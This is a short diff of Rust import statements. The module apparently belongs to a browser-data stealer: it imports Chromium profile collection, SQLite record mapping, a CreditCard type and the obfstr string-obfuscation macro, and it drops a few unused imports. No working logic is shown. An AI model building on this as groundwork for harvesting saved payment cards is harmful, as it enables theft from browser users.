@@ -1,12 +1,10 @@
 use alloc::boxed::Box;
-use sqlite::{DatabaseReader, TableRecord, TableRecordExtension};
-use alloc::string::{String, ToString};
+use sqlite::{TableRecord, TableRecordExtension};
 use crate::alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
-use sqlite::read_sqlite3_database_by_bytes;
 use tasks::{parent_name, Task};
-use utils::path::{Path, WriteToFile};
+use utils::path::Path;
 use crate::chromium::Browser;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, CreditCard};
 use obfstr::obfstr as s;
